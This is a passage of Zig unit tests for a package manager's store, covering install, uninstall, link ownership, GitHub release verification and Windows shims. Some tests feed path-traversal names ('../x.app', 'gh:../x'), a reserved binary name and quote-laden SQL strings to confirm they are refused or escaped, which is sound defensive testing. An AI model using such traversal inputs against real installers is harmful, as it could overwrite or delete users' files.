        @memset(data, 'A');
        @memcpy(data[offset..][0..pattern.len], pattern);
        try tmp.dir.writeFile(.{ .sub_path = "boundary.bin", .data = data });

        var t = try Store.scanFile(testing.allocator, p);
        defer t.deinit();
        try testing.expectEqual(@as(u32, 20), t.score);
        try testing.expectEqual(@as(usize, 1), t.reasons.items.len);
    }
}

test "scanStore groups every store directory by package name in one pass" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();

    try tmp.dir.makePath("store/jq@1.6@x86_64-linux");
    try tmp.dir.makePath("store/jq@1.7.1@x86_64-linux");
    try tmp.dir.makePath("store/jq@1.7.1@aarch64-macos");
    try tmp.dir.makePath("store/jq-extra@9.0@x86_64-linux");
    try tmp.dir.makePath("store/jq@9.2@x86_64-linux.abcd.tmp");

    var index = try s.scanStore(arena.allocator());
    const jq = index.get("jq") orelse return error.TestUnexpectedResult;
    try testing.expectEqual(@as(usize, 3), jq.items.len);
    const extra = index.get("jq-extra") orelse return error.TestUnexpectedResult;
    try testing.expectEqual(@as(usize, 1), extra.items.len);
    try testing.expect(index.get("jq-") == null);
}

test "sql string escaping neutralises quotes" {
    var buf = std.ArrayList(u8).init(testing.allocator);
    defer buf.deinit();
    try Store.writeSqlString(buf.writer(), "it's a 'test'");
    try testing.expectEqualStrings("'it''s a ''test'''", buf.items);
}

test "installedVersions parses store directory names" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    var s = Store{
        .allocator = testing.allocator,
        .home = try testing.allocator.dupe(u8, root),
        .root = try testing.allocator.dupe(u8, root),
        .store_root = try testing.allocator.dupe(u8, root),
        .bin_root = try testing.allocator.dupe(u8, root),
        .shells_root = try testing.allocator.dupe(u8, root),
        .apps_root = try testing.allocator.dupe(u8, root),
        .registry_root = try testing.allocator.dupe(u8, root),
        .locks_root = try testing.allocator.dupe(u8, root),
    };
    defer s.deinit();

    try tmp.dir.makePath("jq@1.6@x86_64-linux");
    try tmp.dir.makePath("jq@1.7.1@x86_64-linux");
    try tmp.dir.makePath("jq@1.7.1@aarch64-macos");
    try tmp.dir.makePath("jq-extra@9.0@x86_64-linux");
    try tmp.dir.makePath("other@2.0@x86_64-linux");
    // Old-format and temp directories are ignored, never matched.
    try tmp.dir.makePath("jq-9.1-x86_64-linux");
    try tmp.dir.makePath("jq@9.2@x86_64-linux.abcd.tmp");

    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();

    const found = try s.installedVersions(arena.allocator(), "jq", "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), found.len);

    var newest: []const u8 = found[0].version;
    for (found[1..]) |f| {
        if (registry.compareVersions(f.version, newest) == .gt) newest = f.version;
    }
    try testing.expectEqualStrings("1.7.1", newest);
}

/// A Store whose every directory lives under a fresh temp dir.
fn testStore(tmp: *testing.TmpDir) !Store {
    const a = testing.allocator;
    const root = try tmp.dir.realpathAlloc(a, ".");
    defer a.free(root);
    const s = Store{
        .allocator = a,
        .home = try a.dupe(u8, root),
        .root = try a.dupe(u8, root),
        .store_root = try std.fs.path.join(a, &.{ root, "store" }),
        .bin_root = try std.fs.path.join(a, &.{ root, "bin" }),
        .shells_root = try std.fs.path.join(a, &.{ root, "shells" }),
        .apps_root = try std.fs.path.join(a, &.{ root, "apps" }),
        .registry_root = try std.fs.path.join(a, &.{ root, "registry" }),
        .locks_root = try std.fs.path.join(a, &.{ root, "locks" }),
    };
    for ([_][]const u8{ s.store_root, s.bin_root, s.shells_root, s.apps_root, s.registry_root, s.locks_root }) |d| {
        try std.fs.cwd().makePath(d);
    }
    return s;
}

test "store dir names round-trip and cannot collide" {
    const a = testing.allocator;
    const d1 = try Store.storeDirName(a, .{ .name = "a-1", .version = "2" }, "x86_64-linux");
    defer a.free(d1);
    const d2 = try Store.storeDirName(a, .{ .name = "a", .version = "1-2" }, "x86_64-linux");
    defer a.free(d2);

    try testing.expectEqualStrings("a-1@2@x86_64-linux", d1);
    try testing.expect(!std.mem.eql(u8, d1, d2));

    const p = Store.parseStoreDirName(d1) orelse return error.TestUnexpectedResult;
    try testing.expectEqualStrings("a-1", p.name);
    try testing.expectEqualStrings("2", p.version);
    try testing.expectEqualStrings("x86_64-linux", p.platform);

    const q = Store.parseStoreDirName(d2) orelse return error.TestUnexpectedResult;
    try testing.expectEqualStrings("a", q.name);
    try testing.expectEqualStrings("1-2", q.version);

    try testing.expect(Store.parseStoreDirName("jq-1.7.1-x86_64-linux") == null);
    try testing.expect(Store.parseStoreDirName("jq@1.7.1@x86_64-linux.abc.tmp") == null);
}

test "uninstall foo leaves foo-bar alone" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("store/foo@1.0@x86_64-linux");
    try tmp.dir.makePath("store/foo-bar@1.0@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "bin/foo" ++ platform.exe_suffix, .data = "foo" });
    try tmp.dir.writeFile(.{ .sub_path = "bin/foo-bar" ++ platform.exe_suffix, .data = "foo-bar" });
    const recs = [_]Store.OwnerRec{
        .{ .kind = "bin", .name = "foo", .pkg = "foo" },
        .{ .kind = "bin", .name = "foo-bar", .pkg = "foo-bar" },
    };
    try s.writeOwners(a, &recs);

    const plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux" }};
    const pkg = Package{ .name = "foo", .version = "1.0", .platforms = &plats };
    try testing.expect(try s.uninstall(a, pkg));

    try tmp.dir.access("store/foo-bar@1.0@x86_64-linux", .{});
    try tmp.dir.access("bin/foo-bar" ++ platform.exe_suffix, .{});
    try testing.expectError(error.FileNotFound, tmp.dir.access("store/foo@1.0@x86_64-linux", .{}));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/foo" ++ platform.exe_suffix, .{}));
}

test "bin conflicts are refused unless forced" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("store/tool@1.0@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.0@x86_64-linux/tool" ++ platform.exe_suffix, .data = "new" });
    try tmp.dir.writeFile(.{ .sub_path = "bin/tool" ++ platform.exe_suffix, .data = "user's own file" });

    const pkg_dir = try std.fs.path.join(a, &.{ s.store_root, "tool@1.0@x86_64-linux" });
    const plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux" }};
    const bins = [_][]const u8{"tool"};
    const pkg = Package{ .name = "tool", .version = "1.0", .bin = &bins, .platforms = &plats };

    try testing.expectError(StoreError.BinaryConflict, s.linkBinaries(a, pkg, plats[0], pkg_dir, .{ .quiet = true }));
    const kept = try tmp.dir.readFileAlloc(a, "bin/tool" ++ platform.exe_suffix, 64);
    try testing.expectEqualStrings("user's own file", kept);

    try testing.expectEqual(@as(usize, 1), try s.linkBinaries(a, pkg, plats[0], pkg_dir, .{ .quiet = true, .force = true }));
    // Now recorded as ours, so a plain re-link is allowed.
    try testing.expectEqual(@as(usize, 1), try s.linkBinaries(a, pkg, plats[0], pkg_dir, .{ .quiet = true }));

    // Owned by a different package: refused again without force.
    const other = [_]Store.OwnerRec{.{ .kind = "bin", .name = "tool", .pkg = "other" }};
    try s.writeOwners(a, &other);
    try testing.expectError(StoreError.BinaryConflict, s.linkBinaries(a, pkg, plats[0], pkg_dir, .{ .quiet = true }));
}

test "bin_path links the named file directly and still maps an alias" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("store/tool@1.0@x86_64-linux/bin");
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.0@x86_64-linux/bin/tool" ++ platform.exe_suffix, .data = "exe" });
    const tool_dir = try std.fs.path.join(a, &.{ s.store_root, "tool@1.0@x86_64-linux" });
    const tool_plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux", .bin_path = "bin/tool" ++ platform.exe_suffix }};
    const tool_bins = [_][]const u8{"tool"};
    const tool = Package{ .name = "tool", .version = "1.0", .bin = &tool_bins, .platforms = &tool_plats };
    try testing.expectEqual(@as(usize, 1), try s.linkBinaries(a, tool, tool_plats[0], tool_dir, .{ .quiet = true }));
    try tmp.dir.access("bin/tool" ++ platform.exe_suffix, .{});

    // The package calls the binary `btm`, but the archive ships `real/bottom`.
    try tmp.dir.makePath("store/btop@2.0@x86_64-linux/real");
    try tmp.dir.writeFile(.{ .sub_path = "store/btop@2.0@x86_64-linux/real/bottom" ++ platform.exe_suffix, .data = "exe" });
    const btop_dir = try std.fs.path.join(a, &.{ s.store_root, "btop@2.0@x86_64-linux" });
    const btop_plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux", .bin_path = "real/bottom" ++ platform.exe_suffix }};
    const btop_bins = [_][]const u8{"btm"};
    const btop = Package{ .name = "btop", .version = "2.0", .bin = &btop_bins, .platforms = &btop_plats };
    try testing.expectEqual(@as(usize, 1), try s.linkBinaries(a, btop, btop_plats[0], btop_dir, .{ .quiet = true }));
    try tmp.dir.access("bin/btm" ++ platform.exe_suffix, .{});
}

test "a package can never link a bin named abv0" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("store/evil@1.0@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "store/evil@1.0@x86_64-linux/ABV0", .data = "x" });

    const pkg_dir = try std.fs.path.join(a, &.{ s.store_root, "evil@1.0@x86_64-linux" });
    const plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux" }};
    const bins = [_][]const u8{"ABV0"};
    const pkg = Package{ .name = "evil", .version = "1.0", .bin = &bins, .platforms = &plats };

    try testing.expectError(StoreError.ReservedBinaryName, s.linkBinaries(a, pkg, plats[0], pkg_dir, .{ .quiet = true }));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/ABV0", .{}));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/abv0", .{}));
}

test "app bundles must end in .app and are never replaced unless abv0 installed them" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.makePath("store/evil@1.0@x86_64-linux/evil");
    try tmp.dir.writeFile(.{ .sub_path = "store/evil@1.0@x86_64-linux/evil/payload", .data = "x" });
    try tmp.dir.makePath("apps/evil");
    try tmp.dir.writeFile(.{ .sub_path = "apps/evil/keep", .data = "precious" });
    try tmp.dir.makePath("apps/Other.app");
    try tmp.dir.writeFile(.{ .sub_path = "apps/Other.app/keep", .data = "precious" });

    const pkg_dir = try std.fs.path.join(a, &.{ s.store_root, "evil@1.0@x86_64-linux" });
    const plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux" }};

    // Not *.app, and a traversal name: both refused, nothing deleted.
    const bad = [_][]const u8{ "evil", "../x.app" };
    const pkg_bad = Package{ .name = "evil", .version = "1.0", .app_bundles = &bad, .platforms = &plats };
    try s.linkAppBundles(a, pkg_bad, pkg_dir, .{ .quiet = true });
    const kept = try tmp.dir.readFileAlloc(a, "apps/evil/keep", 64);
    try testing.expectEqualStrings("precious", kept);

    // A *.app that is there but was not installed by this package is left alone.
    const foreign = [_][]const u8{"Other.app"};
    const pkg_foreign = Package{ .name = "evil", .version = "1.0", .app_bundles = &foreign, .platforms = &plats };
    try s.linkAppBundles(a, pkg_foreign, pkg_dir, .{ .quiet = true });
    const kept2 = try tmp.dir.readFileAlloc(a, "apps/Other.app/keep", 64);
    try testing.expectEqualStrings("precious", kept2);
}

test "shell sandbox names carry a pid only in the new form" {
    try testing.expectEqual(@as(?i32, 4242), Store.shellPid("shell-1700000000-4242-beef"));
    try testing.expectEqual(@as(?i32, null), Store.shellPid("shell-1700000000-beef"));
    try testing.expectEqual(@as(?i32, null), Store.shellPid("jq@1.0@x86_64-linux"));
    try testing.expect(platform.processAlive(platform.processId()));
}

test "a GitHub release asset with no hash is refused unless the user opts in" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena_state = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena_state.deinit();
    const a = arena_state.allocator();

    var assets = [_]ghrelease.Asset{
        .{ .name = "tool-1.2.3-x86_64-unknown-linux-musl.tar.gz", .url = "https://example.invalid/tool.tar.gz", .size = 10, .sha256 = null },
        .{ .name = "tool-1.2.3-aarch64-apple-darwin.tar.gz", .url = "https://example.invalid/mac.tar.gz", .size = 10, .sha256 = null },
    };
    const rel = ghrelease.Release{ .tag = "v1.2.3", .assets = &assets };
    const spec = ghrelease.Spec{ .owner = "o", .repo = "tool", .tag = null };

    // No digest and no checksums file in the release: nothing is fetched, nothing installed.
    try testing.expectError(StoreError.RefusedUnverifiedInstall, s.installRelease(a, spec, rel, "x86_64-linux", .{ .quiet = true }));
    try testing.expectError(error.FileNotFound, tmp.dir.access("store/tool@1.2.3@x86_64-linux", .{}));

    // No asset for this platform at all.
    try testing.expectError(StoreError.NoMatchingAsset, s.installRelease(a, spec, rel, "x86_64-windows", .{ .quiet = true }));

    // A bare name is not a GitHub project.
    try testing.expectError(StoreError.NotInCatalog, s.installDynamic(a, "nosuchthing", "x86_64-linux", .{ .quiet = true }));
    try testing.expectError(StoreError.InvalidGithubSpec, s.installDynamic(a, "gh:../x", "x86_64-linux", .{ .quiet = true }));
}

test "GitHub installs are listed from their source files" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena_state = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena_state.deinit();
    const a = arena_state.allocator();

    // Two versions from GitHub, a registry install with no source file, a
    // directory whose source file names some other repository, and another platform.
    try tmp.dir.makePath("store/tool@1.2.3@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.2.3@x86_64-linux/.abv0-source", .data = "gh:acme/tool@v1.2.3\n" });
    try tmp.dir.makePath("store/tool@1.10.0@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.10.0@x86_64-linux/.abv0-source", .data = "gh:acme/tool@v1.10.0\n" });
    try tmp.dir.makePath("store/jq@1.7.1@x86_64-linux");
    try tmp.dir.makePath("store/liar@1.0@x86_64-linux");
    try tmp.dir.writeFile(.{ .sub_path = "store/liar@1.0@x86_64-linux/.abv0-source", .data = "gh:acme/other@1.0\n" });
    try tmp.dir.makePath("store/mac@1.0@aarch64-macos");
    try tmp.dir.writeFile(.{ .sub_path = "store/mac@1.0@aarch64-macos/.abv0-source", .data = "gh:acme/mac@1.0\n" });

    const got = try s.githubInstalled(a, "x86_64-linux");
    try testing.expectEqual(@as(usize, 1), got.len);
    try testing.expectEqualStrings("tool", got[0].name);
    try testing.expectEqualStrings("1.10.0", got[0].version);
    try testing.expectEqualStrings("acme", got[0].owner);
    try testing.expectEqualStrings("v1.10.0", got[0].tag);

    // The same repository name from a different project is a conflict.
    const same = ghrelease.Spec{ .owner = "ACME", .repo = "tool", .tag = null };
    try testing.expect(s.conflictingSource(a, "tool", same, "x86_64-linux") == null);
    const other = ghrelease.Spec{ .owner = "evil", .repo = "tool", .tag = null };
    try testing.expectEqualStrings("acme", s.conflictingSource(a, "tool", other, "x86_64-linux").?.owner);
}

test "programs found in a GitHub archive are linked, owned and removed again" {
    if (builtin.os.tag == .windows) return error.SkipZigTest;
    var tmp = testing.tmpDir(.{ .iterate = true });
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena_state = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena_state.deinit();
    const a = arena_state.allocator();

    // The unpacked archive: one top-level directory, the program, a helper,
    // a shared library and a manual.
    var elf = [_]u8{0} ** 64;
    @memcpy(elf[0..7], "\x7fELF\x02\x01\x01");
    elf[16] = 2;
    const dir_name = "store/tool@1.2.3@x86_64-linux";
    try tmp.dir.makePath(dir_name ++ "/tool-1.2.3/bin");
    try tmp.dir.makePath(dir_name ++ "/tool-1.2.3/lib");
    try tmp.dir.makePath(dir_name ++ "/tool-1.2.3/man");
    for ([_][]const u8{ "bin/tool", "bin/tool-helper", "lib/libtool.so", "man/tool-gen" }) |rel| {
        const p = try std.fmt.allocPrint(a, "{s}/tool-1.2.3/{s}", .{ dir_name, rel });
        try tmp.dir.writeFile(.{ .sub_path = p, .data = &elf, .flags = .{ .mode = 0o755 } });
    }
    const pkg_dir = try std.fs.path.join(a, &.{ s.store_root, "tool@1.2.3@x86_64-linux" });

    const bins = try Store.detectBins(a, pkg_dir, "tool", "tool", false, "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), bins.len);
    try testing.expectEqualStrings("tool", bins[0].name);
    try testing.expectEqualStrings("tool-1.2.3/bin/tool", bins[0].path);
    try testing.expectEqualStrings("tool-helper", bins[1].name);

    var plans = std.ArrayList(Store.LinkPlan).init(a);
    var names = std.ArrayList([]const u8).init(a);
    for (bins) |b| {
        try plans.append(.{
            .bin = b.name,
            .src = try safepath.joinSafe(a, pkg_dir, b.path),
            .dst = try std.fs.path.join(a, &.{ s.bin_root, b.name }),
        });
        try names.append(b.name);
    }
    const pkg = Package{ .name = "tool", .version = "1.2.3", .bin = names.items };
    try testing.expectEqual(@as(usize, 2), try s.linkPlans(a, pkg, plans.items, .{ .quiet = true }));
    try tmp.dir.access("bin/tool", .{});
    try tmp.dir.access("bin/tool-helper", .{});
    try testing.expectEqualStrings("tool", (try s.binOwnerOf(a, "tool-helper")).?);

    // A second project may not take a link it does not own.
    const squatter = Package{ .name = "other", .version = "1", .bin = names.items };
    try testing.expectError(StoreError.BinaryConflict, s.linkPlans(a, squatter, plans.items, .{ .quiet = true }));

    // Uninstalling by the name alone removes the links and the store directory.
    const stub_plats = [_]registry.PlatformInfo{.{ .name = "x86_64-linux" }};
    try testing.expect(try s.uninstall(a, .{ .name = "tool", .version = "1.2.3", .platforms = &stub_plats }));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/tool", .{}));
    try testing.expectError(error.FileNotFound, tmp.dir.access(dir_name, .{}));
}

test "a raw GitHub download is the program, named after the repository" {
    if (builtin.os.tag == .windows) return error.SkipZigTest;
    var tmp = testing.tmpDir(.{ .iterate = true });
    defer tmp.cleanup();
    var arena_state = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena_state.deinit();
    const a = arena_state.allocator();

    try tmp.dir.makePath("pkg");
    // Not an executable format, but a lone raw download is the program anyway.
    try tmp.dir.writeFile(.{ .sub_path = "pkg/tool", .data = "not magic at all", .flags = .{ .mode = 0o755 } });
    const pkg_dir = try tmp.dir.realpathAlloc(a, "pkg");
    const bins = try Store.detectBins(a, pkg_dir, "tool", "tool", true, "x86_64-linux");
    try testing.expectEqual(@as(usize, 1), bins.len);
    try testing.expectEqualStrings("tool", bins[0].name);
    try testing.expectEqualStrings("tool", bins[0].path);

    // A raw download that never arrived yields nothing to link.
    const none = try Store.detectBins(a, pkg_dir, "ghost", "ghost", true, "x86_64-linux");
    try testing.expectEqual(@as(usize, 0), none.len);
}

test "tags become store directory names" {
    const a = testing.allocator;
    const cases = [_][2][]const u8{
        .{ "v1.2.3", "tool@1.2.3@x86_64-linux" },
        .{ "1.2.3", "tool@1.2.3@x86_64-linux" },
        .{ "nightly-2024/10", "tool@nightly-2024_10@x86_64-linux" },
    };
    for (cases) |c| {
        const version = try ghverify.versionFromTag(a, c[0]);
        defer a.free(version);
        const dir = try Store.storeDirName(a, .{ .name = "tool", .version = version }, "x86_64-linux");
        defer a.free(dir);
        try testing.expectEqualStrings(c[1], dir);
        // And the name splits back apart.
        const parsed = Store.parseStoreDirName(dir).?;
        try testing.expectEqualStrings("tool", parsed.name);
        try testing.expectEqualStrings(version, parsed.version);
    }
}

test "linkMethodFor: shims only on Windows, scripts are skipped there" {
    const win = std.Target.Os.Tag.windows;
    try testing.expectEqual(Store.LinkMethod.shim, Store.linkMethodFor(win, "C:\\s\\rg.exe"));
    try testing.expectEqual(Store.LinkMethod.shim, Store.linkMethodFor(win, "C:\\s\\tool"));
    try testing.expectEqual(Store.LinkMethod.shim, Store.linkMethodFor(win, "C:\\s.cmd\\tool"));
    try testing.expectEqual(Store.LinkMethod.skip_script, Store.linkMethodFor(win, "C:\\s\\npm.cmd"));
    try testing.expectEqual(Store.LinkMethod.skip_script, Store.linkMethodFor(win, "C:/s/run.BAT"));
    try testing.expectEqual(Store.LinkMethod.skip_script, Store.linkMethodFor(win, "x.ps1"));
    for ([_]std.Target.Os.Tag{ .linux, .macos, .freebsd }) |os| {
        try testing.expectEqual(Store.LinkMethod.link, Store.linkMethodFor(os, "/s/rg"));
        try testing.expectEqual(Store.LinkMethod.link, Store.linkMethodFor(os, "/s/run.cmd"));
    }
}

test "windows shim pairs: create, own, health, replace, remove" {
    var tmp = testing.tmpDir(.{ .iterate = true });
    defer tmp.cleanup();
    var s = try testStore(&tmp);
    defer s.deinit();
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try tmp.dir.writeFile(.{ .sub_path = "fake-abv0", .data = "FAKE ABV0 LAUNCHER" });
    const self_exe = try tmp.dir.realpathAlloc(a, "fake-abv0");

    try tmp.dir.makePath("store/tool@1.0@x86_64-windows");
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.0@x86_64-windows/tool", .data = "real tool" });
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.0@x86_64-windows/helper.cmd", .data = "@echo off" });
    const pkg_dir = try std.fs.path.join(a, &.{ s.store_root, "tool@1.0@x86_64-windows" });
    const tool_src = try std.fs.path.join(a, &.{ pkg_dir, "tool" });
    const cmd_src = try std.fs.path.join(a, &.{ pkg_dir, "helper.cmd" });
    const plans = [_]Store.LinkPlan{
        .{ .bin = "tool", .src = tool_src, .dst = try std.fs.path.join(a, &.{ s.bin_root, "tool" }) },
        .{ .bin = "helper", .src = cmd_src, .dst = try std.fs.path.join(a, &.{ s.bin_root, "helper" }) },
    };
    const bins = [_][]const u8{ "tool", "helper" };
    const pkg = Package{ .name = "tool", .version = "1.0", .bin = &bins };
    const o: InstallOptions = .{ .quiet = true };

    // The script is skipped; the program gets a launcher pair.
    try testing.expectEqual(@as(usize, 1), try s.linkPlansFor(a, pkg, &plans, o, .windows, self_exe));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/helper", .{}));
    try testing.expectEqualStrings("FAKE ABV0 LAUNCHER", try tmp.dir.readFileAlloc(a, "bin/tool" ++ platform.exe_suffix, 64));
    const shim_text = try tmp.dir.readFileAlloc(a, "bin/tool.shim", 4096);
    const parsed = try shim.readShim(a, shim_text);
    try testing.expectEqualStrings(tool_src, parsed.path);
    try testing.expectEqualStrings("tool", (try s.binOwnerOf(a, "tool")).?);
    try testing.expect((try s.binOwnerOf(a, "helper")) == null);

    // Health of the pair.
    const H = Store.BinHealth;
    try testing.expectEqual(H.ok, Store.binHealth(a, s.bin_root, "tool", .windows));
    try tmp.dir.deleteFile("store/tool@1.0@x86_64-windows/tool");
    try testing.expectEqual(H.missing_target, Store.binHealth(a, s.bin_root, "tool", .windows));
    try tmp.dir.writeFile(.{ .sub_path = "store/tool@1.0@x86_64-windows/tool", .data = "real tool" });
    try tmp.dir.writeFile(.{ .sub_path = "bin/tool.shim", .data = "garbage" });
    try testing.expectEqual(H.bad_shim, Store.binHealth(a, s.bin_root, "tool", .windows));
    try tmp.dir.deleteFile("bin/tool.shim");
    try testing.expectEqual(H.missing_shim, Store.binHealth(a, s.bin_root, "tool", .windows));
    try testing.expectEqual(H.ok, Store.binHealth(a, s.bin_root, "tool", .linux));
    try tmp.dir.deleteFile("bin/tool" ++ platform.exe_suffix);
    try testing.expectEqual(H.missing_exe, Store.binHealth(a, s.bin_root, "tool", .windows));

    // fix: an exe with no shim (a plain link from an older abv0) is replaced.
    try tmp.dir.writeFile(.{ .sub_path = "bin/tool" ++ platform.exe_suffix, .data = "old plain link" });
    try testing.expectEqual(@as(usize, 1), try s.linkPlansFor(a, pkg, plans[0..1], o, .windows, self_exe));
    try testing.expectEqual(H.ok, Store.binHealth(a, s.bin_root, "tool", .windows));
    try testing.expectEqualStrings("FAKE ABV0 LAUNCHER", try tmp.dir.readFileAlloc(a, "bin/tool" ++ platform.exe_suffix, 64));
    // Re-linking an existing pair is fine.
    try testing.expectEqual(@as(usize, 1), try s.linkPlansFor(a, pkg, plans[0..1], o, .windows, self_exe));

    // Another package may not take the pair; --force may.
    const squatter = Package{ .name = "other", .version = "1", .bin = &bins };
    try testing.expectError(StoreError.BinaryConflict, s.linkPlansFor(a, squatter, plans[0..1], o, .windows, self_exe));
    try testing.expectEqual(@as(usize, 1), try s.linkPlansFor(a, squatter, plans[0..1], .{ .quiet = true, .force = true }, .windows, self_exe));
    try testing.expectEqualStrings("other", (try s.binOwnerOf(a, "tool")).?);

    // Shim targets are discoverable for prune-style callers.
    const targets = try s.binShimTargets(a);
    try testing.expectEqual(@as(usize, 1), targets.len);
    try testing.expectEqualStrings(tool_src, targets[0]);

    // The launcher exe carries the host's suffix (".exe" on Windows).
    // Removal takes both files; a non-Windows removal only the exe.
    try testing.expect(try Store.removeBinFiles(a, s.bin_root, "tool", .linux));
    try tmp.dir.access("bin/tool.shim", .{});
    try tmp.dir.writeFile(.{ .sub_path = "bin/tool" ++ platform.exe_suffix, .data = "x" });
    try testing.expect(try Store.removeBinFiles(a, s.bin_root, "tool", .windows));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/tool" ++ platform.exe_suffix, .{}));
    try testing.expectError(error.FileNotFound, tmp.dir.access("bin/tool.shim", .{}));
    try testing.expect(!(try Store.removeBinFiles(a, s.bin_root, "tool", .windows)));
}
